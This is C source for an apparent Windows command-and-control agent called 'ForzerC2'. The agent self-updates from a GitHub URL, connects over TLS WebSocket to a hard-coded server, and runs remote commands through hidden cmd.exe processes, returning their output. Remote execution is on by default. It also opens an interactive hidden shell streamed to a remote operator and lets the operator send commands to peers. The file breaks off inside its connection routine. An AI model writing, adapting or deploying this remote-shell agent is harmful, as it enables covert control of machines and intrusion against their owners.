#define WIN32_LEAN_AND_MEAN
#define SECURITY_WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <urlmon.h>
#include <wincrypt.h>
#include <schannel.h>
#include <security.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "secur32.lib")

#define FORZER_UPDATE_URL \
    "https://raw.githubusercontent.com/Peter211231231231232131/ForzerC2/master/Forzer.exe"

/* Control-plane endpoint. Override with FORZER_SERVER=ws://host:port. */
#define DEFAULT_SERVER "wss://forzerc2.onrender.com"

/* ------------------------------------------------------------------ */
/* Self-update                                                        */
/* ------------------------------------------------------------------ */

static int do_update(void) {
    char self_path[MAX_PATH];
    char tmp_path[MAX_PATH];
    char bak_path[MAX_PATH];

    if (!GetModuleFileNameA(NULL, self_path, MAX_PATH)) {
        fprintf(stderr, "error: GetModuleFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    char temp_dir[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_dir) ||
        !GetTempFileNameA(temp_dir, "frz", 0, tmp_path)) {
        fprintf(stderr, "error: GetTempFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    const char *url = getenv("FORZER_UPDATE_URL");
    if (!url || !*url) url = FORZER_UPDATE_URL;

    printf("downloading update from %s\n", url);
    HRESULT hr = URLDownloadToFileA(NULL, url, tmp_path, 0, NULL);
    if (FAILED(hr)) {
        fprintf(stderr, "error: download failed (hr=0x%lx)\n", hr);
        DeleteFileA(tmp_path);
        return 1;
    }

    snprintf(bak_path, MAX_PATH, "%s.bak", self_path);
    DeleteFileA(bak_path);
    if (!MoveFileExA(self_path, bak_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not rename current exe (%lu)\n", GetLastError());
        DeleteFileA(tmp_path);
        return 1;
    }

    if (!MoveFileExA(tmp_path, self_path, MOVEFILE_REPLACE_EXISTING)) {
        fprintf(stderr, "error: could not install update (%lu)\n", GetLastError());
        MoveFileExA(bak_path, self_path, MOVEFILE_REPLACE_EXISTING);
        DeleteFileA(tmp_path);
        return 1;
    }

    printf("update installed: %s\n", self_path);
    printf("previous version kept as: %s\n", bak_path);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Control-plane client (WebSocket over raw Winsock)                  */
/* ------------------------------------------------------------------ */

#define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

/* Remote-command state. Execution defaults ON but can be disabled with
   FORZER_ALLOW_REMOTE=0 (no flag needed). */
static int g_allow_remote = 1;
static SOCKET g_sock = INVALID_SOCKET;

/* wss (TLS) transport via SCHANNEL */
static int g_use_tls = 0;
static CredHandle g_cred;
static CtxtHandle g_ctx;
static SOCKET g_tls_sock = INVALID_SOCKET;
static SecPkgContext_StreamSizes g_ssizes;
static BYTE *g_tls_in = NULL; static int g_tls_in_len = 0, g_tls_in_cap = 0;
static BYTE *g_tls_out = NULL; static int g_tls_out_len = 0, g_tls_out_off = 0;

static int tr_send(const char *data, int len);
static int tr_recv(char *out, int cap);

/* ------------------------------------------------------------------ */
/* Interactive terminal session (streaming shell to a viewer)         */
/* ------------------------------------------------------------------ */

typedef struct {
    int active;            /* 1 while a session is live */
    char id[64];           /* session id from the viewer */
    char to[64];           /* viewer id to route data back to */
    HANDLE hInWrite;       /* child stdin write end (agent->child) */
    HANDLE hOutRead;       /* child stdout/stderr read end */
    HANDLE hProc;          /* child process handle */
    HANDLE hThread;        /* reader thread */
    CRITICAL_SECTION lock;
} term_session_t;

static term_session_t g_term;

static DWORD WINAPI term_reader_thread(LPVOID lp);
static void term_send(const char *kind, const char *data, int len, int rc);
static int run_interactive(const char *to, const char *id);
static void term_write_input(const char *data, int len);
static void term_stop(void);
static int tls_send(const char *data, int len);
static int tls_recv(char *out, int cap);

static void base64(const BYTE *in, int n, char *out) {
    static const char t[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = t[v & 63];
    }
    int rem = n - i;
    if (rem == 1) {
        unsigned v = in[i] << 16;
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = '='; out[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8);
        out[o++] = t[(v >> 18) & 63]; out[o++] = t[(v >> 12) & 63];
        out[o++] = t[(v >> 6) & 63]; out[o++] = '=';
    }
    out[o] = 0;
}

static int sha1(const BYTE *data, DWORD len, BYTE out[20]) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    HCRYPTHASH hh;
    if (!CryptCreateHash(h, CALG_SHA1, 0, 0, &hh)) { CryptReleaseContext(h, 0); return 0; }
    CryptHashData(hh, data, len, 0);
    DWORD s = 20;
    CryptGetHashParam(hh, HP_HASHVAL, out, &s, 0);
    CryptDestroyHash(hh);
    CryptReleaseContext(h, 0);
    return 1;
}

static int rng_bytes(BYTE *buf, int n) {
    HCRYPTPROV h;
    if (!CryptAcquireContext(&h, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return 0;
    int ok = CryptGenRandom(h, n, buf);
    CryptReleaseContext(h, 0);
    return ok;
}

static int sock_recv_n(SOCKET s, char *buf, int len) {
    int got = 0;
    while (got < len) {
        int r = recv(s, buf + got, len - got, 0);
        if (r <= 0) return 0;
        got += r;
    }
    return 1;
}

static int sock_send_all(SOCKET s, const char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, buf + sent, len - sent, 0);
        if (r <= 0) return 0;
        sent += r;
    }
    return 1;
}

static int ws_send_frame(SOCKET s, unsigned char opcode, const char *data, int len) {
    unsigned char hdr[10];
    int hl = 2;
    hdr[0] = 0x80 | opcode;
    BYTE mask[4];
    rng_bytes(mask, 4);
    if (len < 126) {
        hdr[1] = 0x80 | (unsigned char)len;
    } else if (len < 65536) {
        hdr[1] = 0x80 | 126;
        hdr[2] = (unsigned char)(len >> 8);
        hdr[3] = (unsigned char)len;
        hl = 4;
    } else {
        hdr[1] = 0x80 | 127;
        for (int i = 0; i < 8; i++) hdr[2 + i] = (unsigned char)((long long)len >> (8 * (7 - i)));
        hl = 10;
    }
    int framelen = hl + 4 + (len > 0 ? len : 0);
    BYTE *frame = (BYTE *)malloc(framelen > 0 ? framelen : 1);
    if (!frame) return 0;
    memcpy(frame, hdr, hl);
    memcpy(frame + hl, mask, 4);
    if (len > 0) {
        for (int i = 0; i < len; i++) frame[hl + 4 + i] = (BYTE)(data[i] ^ mask[i & 3]);
    }
    int ok;
    if (g_use_tls) ok = tls_send((char *)frame, framelen);
    else ok = sock_send_all(s, (char *)frame, framelen);
    free(frame);
    return ok;
}

static int ws_net_recv_n(char *buf, int len) {
    if (g_use_tls) {
        int got = 0;
        while (got < len) {
            int r = tls_recv(buf + got, len - got);
            if (r <= 0) return 0;
            got += r;
        }
        return 1;
    }
    return sock_recv_n(g_sock, buf, len);
}

static int ws_recv(SOCKET s, char *out, int cap) {
    unsigned char h[2];
    if (!ws_net_recv_n((char *)h, 2)) return -1;
    int opcode = h[0] & 0x0f;
    int masked = h[1] & 0x80;
    long long len = h[1] & 0x7f;
    if (len == 126) {
        unsigned char e[2];
        if (!ws_net_recv_n((char *)e, 2)) return -1;
        len = (e[0] << 8) | e[1];
    } else if (len == 127) {
        unsigned char e[8];
        if (!ws_net_recv_n((char *)e, 8)) return -1;
        len = 0;
        for (int i = 0; i < 8; i++) len = (len << 8) | e[i];
    }
    unsigned char mkey[4];
    if (masked && !ws_net_recv_n((char *)mkey, 4)) return -1;
    if (len >= cap) {
        long long left = len; char tmp[512];
        while (left > 0) {
            int c = (int)(left > sizeof(tmp) ? sizeof(tmp) : left);
            if (!ws_net_recv_n(tmp, c)) return -1;
            left -= c;
        }
        /* Frame was larger than our buffer; skip it and keep reading the
           next frame instead of killing the connection. */
        return ws_recv(s, out, cap);
    }
    if (!ws_net_recv_n(out, (int)len)) return -1;
    if (masked) for (long long i = 0; i < len; i++) out[i] ^= mkey[i & 3];
    out[len] = 0;

    if (opcode == 0x8) return -1;
    if (opcode == 0x9) {
        ws_send_frame(s, 0xA, out, (int)len);
        return ws_recv(s, out, cap);
    }
    if (opcode == 0xA) return ws_recv(s, out, cap);
    if (opcode != 0x1) return ws_recv(s, out, cap);
    return (int)len;
}

/* ------------------------------------------------------------------ */
/* wss (TLS) transport via SCHANNEL                                   */
/* ------------------------------------------------------------------ */

static int tls_send(const char *data, int len) {
    int max = g_ssizes.cbMaximumMessage;
    int off = 0;
    while (off < len) {
        int chunk = len - off;
        if (chunk > max) chunk = max;
        int msglen = g_ssizes.cbHeader + chunk + g_ssizes.cbTrailer;
        BYTE *msg = malloc(msglen);
        if (!msg) return 0;
        memcpy(msg + g_ssizes.cbHeader, data + off, chunk);
        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER; bufs[0].pvBuffer = msg; bufs[0].cbBuffer = g_ssizes.cbHeader;
        bufs[1].BufferType = SECBUFFER_DATA; bufs[1].pvBuffer = msg + g_ssizes.cbHeader; bufs[1].cbBuffer = chunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER; bufs[2].pvBuffer = msg + g_ssizes.cbHeader + chunk; bufs[2].cbBuffer = g_ssizes.cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
        if (EncryptMessage(&g_ctx, 0, &bd, 0) != SEC_E_OK) { free(msg); return 0; }
        int total = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        if (!sock_send_all(g_tls_sock, (char *)msg, total)) { free(msg); return 0; }
        free(msg);
        off += chunk;
    }
    return 1;
}

static int tls_recv(char *out, int cap) {
    if (g_tls_out_len - g_tls_out_off > 0) {
        int n = g_tls_out_len - g_tls_out_off;
        if (n > cap) n = cap;
        memcpy(out, g_tls_out + g_tls_out_off, n);
        g_tls_out_off += n;
        if (g_tls_out_off >= g_tls_out_len) {
            free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
        }
        return n;
    }
    for (;;) {
        BYTE tmp[16384];
        int r = recv(g_tls_sock, (char *)tmp, sizeof(tmp), 0);
        if (r <= 0) return -1;
        if (g_tls_in_len + r > g_tls_in_cap) {
            g_tls_in_cap = (g_tls_in_len + r) * 2;
            g_tls_in = realloc(g_tls_in, g_tls_in_cap);
        }
        memcpy(g_tls_in + g_tls_in_len, tmp, r);
        g_tls_in_len += r;

        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_DATA; bufs[0].pvBuffer = g_tls_in; bufs[0].cbBuffer = g_tls_in_len;
        bufs[1].BufferType = SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL; bufs[1].cbBuffer = 0;
        bufs[2].BufferType = SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL; bufs[2].cbBuffer = 0;
        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
        SECURITY_STATUS st = DecryptMessage(&g_ctx, &bd, 0, NULL);
        if (st == SEC_E_OK) {
            BYTE *plain = (BYTE *)bufs[1].pvBuffer;
            int plainLen = bufs[1].cbBuffer;
            BYTE *extra = (BYTE *)bufs[3].pvBuffer;
            int extraLen = bufs[3].cbBuffer;
            int consumed = (extraLen > 0) ? (int)(extra - g_tls_in) : g_tls_in_len;
            int leftover = g_tls_in_len - consumed;
            if (leftover > 0) memmove(g_tls_in, g_tls_in + consumed, leftover);
            g_tls_in_len = leftover;
            g_tls_out = malloc(plainLen > 0 ? plainLen : 1);
            memcpy(g_tls_out, plain, plainLen);
            g_tls_out_len = plainLen; g_tls_out_off = 0;
            int n = plainLen; if (n > cap) n = cap;
            memcpy(out, g_tls_out, n);
            g_tls_out_off = n;
            if (g_tls_out_off >= g_tls_out_len) {
                free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
            }
            return n;
        } else if (st == SEC_E_INCOMPLETE_MESSAGE) {
            continue;
        } else {
            return -1;
        }
    }
}

static int tls_handshake(const char *host, int port) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    char ps[16];
    snprintf(ps, sizeof(ps), "%d", port);
    if (getaddrinfo(host, ps, &hints, &res) != 0) return 1;
    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return 1; }
    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        fprintf(stderr, "error: tls connect failed (%d)\n", WSAGetLastError());
        closesocket(s); freeaddrinfo(res); return 1;
    }
    {
        DWORD to = 10000;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    }
    freeaddrinfo(res);
    g_tls_sock = s;
    g_sock = s;

    SCHANNEL_CRED sc;
    memset(&sc, 0, sizeof(sc));
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
    TimeStamp ts;
    if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL,
                                  &sc, NULL, NULL, &g_cred, &ts) != SEC_E_OK) {
        fprintf(stderr, "error: tls credential init failed (0x%lx)\n", GetLastError());
        closesocket(s); g_tls_sock = INVALID_SOCKET; return 1;
    }

    SecBuffer inbuf[2];
    SecBuffer outbuf[2];
    SecBufferDesc inbd, outbd;
    DWORD outFlags;
    BYTE *extra = NULL;
    DWORD extraLen = 0;
    BOOL haveCtx = FALSE;
    BOOL needSend = TRUE;
    SECURITY_STATUS rc;

    for (;;) {
        outbuf[0].BufferType = SECBUFFER_TOKEN;
        outbuf[0].pvBuffer = NULL;
        outbuf[0].cbBuffer = 0;
        outbuf[1].BufferType = SECBUFFER_ALERT;
        outbuf[1].pvBuffer = NULL;
        outbuf[1].cbBuffer = 0;
        outbd.ulVersion = SECBUFFER_VERSION;
        outbd.cBuffers = 2;
        outbd.pBuffers = outbuf;

        if (needSend) {
            if (haveCtx && extraLen > 0) {
                inbuf[0].BufferType = SECBUFFER_TOKEN;
                inbuf[0].pvBuffer = extra;
                inbuf[0].cbBuffer = extraLen;
                inbuf[1].BufferType = SECBUFFER_EMPTY;
                inbuf[1].pvBuffer = NULL;
                inbuf[1].cbBuffer = 0;
                inbd.ulVersion = SECBUFFER_VERSION;
                inbd.cBuffers = 2;
                inbd.pBuffers = inbuf;
            } else {
                inbd.ulVersion = SECBUFFER_VERSION;
                inbd.cBuffers = 0;
                inbd.pBuffers = NULL;
            }
            rc = InitializeSecurityContextA(&g_cred, haveCtx ? &g_ctx : NULL,
                (SEC_CHAR *)host,
                ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
                ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM,
                0, 0, haveCtx ? &inbd : NULL, 0, &g_ctx, &outbd, &outFlags, &ts);
            if (outbuf[0].cbBuffer && outbuf[0].pvBuffer) {
                sock_send_all(g_tls_sock, (char *)outbuf[0].pvBuffer, outbuf[0].cbBuffer);
                FreeContextBuffer(outbuf[0].pvBuffer);
                outbuf[0].pvBuffer = NULL; outbuf[0].cbBuffer = 0;
            }
            if (rc == SEC_E_OK || rc == SEC_I_CONTINUE_NEEDED) {
                if (haveCtx && extraLen > 0) {
                    int foundExtra = 0;
                    for (int i = 0; i < 2; i++) {
                        if (outbuf[i].BufferType == SECBUFFER_EXTRA) {
                            foundExtra = 1;
                            ULONG left = outbuf[i].cbBuffer;
                            if (left == 0) {
                                free(extra); extra = NULL; extraLen = 0;
                            } else if (left < extraLen) {
                                memmove(extra, extra + extraLen - left, left);
                                extraLen = left;
                            }
                            break;
                        }
                    }
                    if (!foundExtra) {
                        free(extra); extra = NULL; extraLen = 0;
                    }
                }
                if (rc == SEC_E_OK) { haveCtx = TRUE; break; }
                haveCtx = TRUE;
                needSend = FALSE;
                continue;
            }
            fprintf(stderr, "error: tls handshake failed (0x%lx)\n", (DWORD)rc);
            if (extra) free(extra);
            return 1;
        } else {
            for (;;) {
                BYTE rh[5];
                int got = 0;
                while (got < 5) {
                    int r = recv(g_tls_sock, (char *)rh + got, 5 - got, 0);
                    if (r <= 0) { if (extra) free(extra); return 1; }
                    got += r;
                }
                int reclen = (rh[3] << 8) | rh[4];
                if (reclen > 65536) { if (extra) free(extra); return 1; }
                BYTE *body = (BYTE *)malloc(reclen);
                got = 0;
                while (got < reclen) {
                    int r = recv(g_tls_sock, (char *)body + got, reclen - got, 0);
                    if (r <= 0) { free(body); if (extra) free(extra); return 1; }
                    got += r;
                }
                extra = (BYTE *)realloc(extra, extraLen + 5 + reclen);
                memcpy(extra + extraLen, rh, 5);
                memcpy(extra + extraLen + 5, body, reclen);
                extraLen += 5 + reclen;
                free(body);
                break;
            }
            needSend = TRUE;
        }
    }
    if (extra && extraLen > 0) {
        g_tls_in = malloc(extraLen);
        memcpy(g_tls_in, extra, extraLen);
        g_tls_in_len = extraLen;
        g_tls_in_cap = extraLen;
    }
    if (extra) free(extra);

    if (QueryContextAttributesA(&g_ctx, SECPKG_ATTR_STREAM_SIZES, &g_ssizes) != SEC_E_OK)
        return 1;
    g_use_tls = 1;

    /* Clear the 10s recv timeout we set for the handshake; otherwise an idle
       link (no traffic for 10s) makes recv() return 0 and the client tears
       down the connection. The server's WebSocket ping keeps us alive. */
    {
        DWORD to = 0;
        setsockopt(g_tls_sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    }
    return 0;
}

static int tr_send(const char *data, int len) {
    return ws_send_frame(g_sock, 0x1, data, len) ? len : -1;
}

static int tr_recv(char *out, int cap) {
    return ws_recv(g_sock, out, cap);
}

static const char *json_str(const char *s, const char *key, char *out, int outsz) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return NULL;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (!*p) return NULL;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return NULL;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < outsz - 1) {
        if (*p == '\\' && p[1]) {
            p++;
            char c = *p;
            if (c == 'n') out[i++] = '\n';
            else if (c == 't') out[i++] = '\t';
            else if (c == 'r') out[i++] = '\r';
            else if (c == '\\') out[i++] = '\\';
            else if (c == '"') out[i++] = '"';
            else { out[i++] = '\\'; if (i < outsz - 1) out[i++] = c; }
            p++;
        } else {
            out[i++] = *p++;
        }
    }
    out[i] = 0;
    return out;
}

static void json_escape(const char *in, char *out, int cap) {
    int i = 0;
    for (; *in && i < cap - 2; in++) {
        if (*in == '"' || *in == '\\') { out[i++] = '\\'; out[i++] = *in; }
        else if (*in == '\n') { out[i++] = '\\'; out[i++] = 'n'; }
        else if (*in == '\r') { out[i++] = '\\'; out[i++] = 'r'; }
        else if (*in == '\t') { out[i++] = '\\'; out[i++] = 't'; }
        else out[i++] = *in;
    }
    out[i] = 0;
}

static void apply_peer(const char *id, const char *name, const char *ip, const char *pubkey) {
    printf("[peer] %s (%s) ip=%s pubkey=%s\n", name, id, ip, pubkey);
    /* TODO: add peer to the local wireguard-nt adapter. */
}

static void for_each_peer(const char *json,
                          void (*cb)(const char *, const char *, const char *, const char *)) {
    const char *p = strstr(json, "\"peers\"");
    if (!p) return;
    p = strchr(p, '[');
    if (!p) return;
    p++;
    while (*p && *p != ']') {
        if (*p == '{') {
            const char *end = p;
            int depth = 0;
            while (*end) {
                if (*end == '{') depth++;
                else if (*end == '}') { depth--; if (depth == 0) { end++; break; } }
                end++;
            }
            char obj[2048];
            int n = (int)(end - p);
            if (n >= (int)sizeof(obj)) n = (int)sizeof(obj) - 1;
            memcpy(obj, p, n);
            obj[n] = 0;
            char id[64], name[64], ip[64], pb[512];
            json_str(obj, "id", id, sizeof(id));
            json_str(obj, "name", name, sizeof(name));
            json_str(obj, "ip", ip, sizeof(ip));
            json_str(obj, "pubkey", pb, sizeof(pb));
            if (id[0]) cb(id, name, ip, pb);
            p = end;
        } else {
            p++;
        }
    }
}

/* Run a command via cmd.exe, capture stdout+stderr into out (cap bytes). */
static int run_command(const char *cmd, char *out, int cap) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    si.dwFlags = STARTF_USESTDHANDLES;
    char full[1024];
    snprintf(full, sizeof(full), "cmd.exe /c %s", cmd);
    if (!CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return -1;
    }
    CloseHandle(hWrite);
    DWORD total = 0, r;
    char tmp[4096];
    while (ReadFile(hRead, tmp, sizeof(tmp), &r, NULL) && r > 0) {
        if (total + r < (DWORD)cap - 1) {
            memcpy(out + total, tmp, r);
            total += r;
        }
    }
    out[total] = 0;
    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)code;
}

/* Send a terminal protocol frame back to the control plane. */
static void term_send(const char *kind, const char *data, int len, int rc) {
    /* Base64 the raw bytes so binary/CRLF survive the JSON transport. */
    static char b64[44000];
    int need = ((len + 2) / 3) * 4 + 1;
    if (need > (int)sizeof(b64)) need = (int)sizeof(b64);
    int n = 0;
    if (len > 0) {
        /* chunked base64 to bound stack usage */
        char tmp[4096];
        int done = 0;
        while (done < len) {
            int c = len - done; if (c > 3072) c = 3072;
            char chunkb64[4100];
            /* base64 of data+done..c */
            int outi = 0;
            const unsigned char *p = (const unsigned char *)data + done;
            for (int i = 0; i + 2 < c; i += 3) {
                unsigned v = (p[i] << 16) | (p[i+1] << 8) | p[i+2];
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = t[(v>>6)&63]; chunkb64[outi++] = t[v&63];
            }
            int rem = c - (c/3)*3;
            if (rem == 1) {
                unsigned v = p[c-1] << 16;
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = '='; chunkb64[outi++] = '=';
            } else if (rem == 2) {
                unsigned v = (p[c-2] << 16) | (p[c-1] << 8);
                static const char t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                chunkb64[outi++] = t[(v>>18)&63]; chunkb64[outi++] = t[(v>>12)&63];
                chunkb64[outi++] = t[(v>>6)&63]; chunkb64[outi++] = '=';
            }
            if (n + outi >= need - 1) outi = (need - 1) - n;
            memcpy(b64 + n, chunkb64, outi);
            n += outi;
            done += c;
        }
    }
    b64[n] = 0;

    char msg[45000];
    if (rc >= 0)
        snprintf(msg, sizeof(msg),
            "{\"type\":\"%s\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":%d}",
            kind, g_term.to, g_term.id, b64, rc);
    else
        snprintf(msg, sizeof(msg),
            "{\"type\":\"%s\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\"}",
            kind, g_term.to, g_term.id, b64);
    tr_send(msg, (int)strlen(msg));
}

static void term_write_input(const char *data, int len) {
    if (!g_term.active || g_term.hInWrite == INVALID_HANDLE_VALUE) return;
    DWORD w;
    WriteFile(g_term.hInWrite, data, len, &w, NULL);
}

static void term_stop(void) {
    if (!g_term.active) return;
    g_term.active = 0;
    /* Kill the child shell so reader thread drains and exits. */
    if (g_term.hProc) {
        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, GetProcessId(g_term.hProc));
        if (hp) { TerminateProcess(hp, 1); CloseHandle(hp); }
    }
    if (g_term.hThread) {
        WaitForSingleObject(g_term.hThread, 2000);
        CloseHandle(g_term.hThread);
        g_term.hThread = NULL;
    }
    if (g_term.hInWrite != INVALID_HANDLE_VALUE) { CloseHandle(g_term.hInWrite); g_term.hInWrite = INVALID_HANDLE_VALUE; }
    if (g_term.hOutRead != INVALID_HANDLE_VALUE) { CloseHandle(g_term.hOutRead); g_term.hOutRead = INVALID_HANDLE_VALUE; }
    if (g_term.hProc) { CloseHandle(g_term.hProc); g_term.hProc = NULL; }
    term_send("term-end", "", 0, 0);
}

static DWORD WINAPI term_reader_thread(LPVOID lp) {
    (void)lp;
    char tmp[4096];
    DWORD r;
    while (g_term.active && ReadFile(g_term.hOutRead, tmp, sizeof(tmp), &r, NULL) && r > 0) {
        term_send("term-data", tmp, (int)r, -1);
    }
    /* process exited */
    int rc = -1;
    if (g_term.hProc) {
        DWORD code = 0;
        if (GetExitCodeProcess(g_term.hProc, &code)) rc = (int)code;
    }
    term_send("term-exit", "", 0, rc);
    g_term.active = 0;
    return 0;
}

/* Launch an interactive cmd.exe with redirected pipes and stream output. */
static int run_interactive(const char *to, const char *id) {
    if (g_term.active) term_stop();

    HANDLE hInRead = INVALID_HANDLE_VALUE, hInWrite = INVALID_HANDLE_VALUE;
    HANDLE hOutRead = INVALID_HANDLE_VALUE, hOutWrite = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hInRead, &hInWrite, &sa, 0)) return -1;
    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) {
        CloseHandle(hInRead); CloseHandle(hInWrite); return -1;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;
    si.hStdInput = hInRead;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        CloseHandle(hOutRead); CloseHandle(hOutWrite);
        return -1;
    }
    CloseHandle(hOutWrite);   /* child has its copy */
    CloseHandle(hInRead);     /* child has its copy */
    CloseHandle(pi.hThread);

    memset(&g_term, 0, sizeof(g_term));
    g_term.active = 1;
    strncpy(g_term.id, id, sizeof(g_term.id) - 1);
    strncpy(g_term.to, to, sizeof(g_term.to) - 1);
    g_term.hInWrite = hInWrite;
    g_term.hOutRead = hOutRead;
    g_term.hProc = pi.hProcess;
    g_term.hThread = CreateThread(NULL, 0, term_reader_thread, NULL, 0, NULL);

    term_send("term-data", "", 0, -1); /* open the stream on the viewer side */
    return 0;
}

/* Interactive prompt: type 'run <peer-id> <command>' to send. */
static DWORD WINAPI reader_thread(LPVOID lp) {
    (void)lp;
    char line[8192];
    while (fgets(line, sizeof(line), stdin)) {
        char *nl = strchr(line, '\n'); if (nl) *nl = 0;
        nl = strchr(line, '\r'); if (nl) *nl = 0;
        if (strncmp(line, "run ", 4) == 0) {
            char *rest = line + 4;
            char *sp = strchr(rest, ' ');
            if (!sp) { printf("usage: run <peer-id> <command>\n"); continue; }
            *sp = 0;
            char *peer = rest;
            char *cmd = sp + 1;
            BYTE rid[4];
            rng_bytes(rid, 4);
            static const char hx[] = "0123456789abcdef";
            char id[16];
            for (int k = 0; k < 4; k++) {
                id[k * 2] = hx[(rid[k] >> 4) & 15];
                id[k * 2 + 1] = hx[rid[k] & 15];
            }
            id[8] = 0;
            char esc[8192];
            json_escape(cmd, esc, sizeof(esc));
            char msg[9000];
            snprintf(msg, sizeof(msg),
                     "{\"type\":\"command\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\"}",
                     peer, id, esc);
             tr_send(msg, (int)strlen(msg));
            printf("sent command to %s (id=%s)\n", peer, id);
        } else if (strcmp(line, "exit") == 0 || strcmp(line, "quit") == 0) {
            break;
        } else if (line[0]) {
            printf("commands: run <peer-id> <command>  (exit to quit)\n");
        }
    }
    return 0;
}

static int connect_mode(const char *url, const char *setup_key, const char *name) {
    setvbuf(stdout, NULL, _IONBF, 0);

    const char *ar = getenv("FORZER_ALLOW_REMOTE");
    g_allow_remote = (ar == NULL || strcmp(ar, "0") != 0) ? 1 : 0;
    if (g_allow_remote)
        printf("WARNING: remote command execution is ENABLED on this host.\n");

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
